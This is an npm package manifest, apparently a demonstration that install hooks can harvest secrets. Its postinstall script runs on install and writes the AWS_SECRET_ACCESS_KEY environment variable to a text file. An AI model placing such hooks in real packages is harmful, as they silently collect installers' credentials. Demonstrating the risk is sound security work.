{
	"name": "yarn-contained-token-extractor",
	"description": "A demo application to show how yarn/npm install can collect environment variables and SSH keys",
	"version": "0.0.1",
	"scripts": {
		"postinstall": "echo AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY > aws-secret-access-key.txt"
	}
}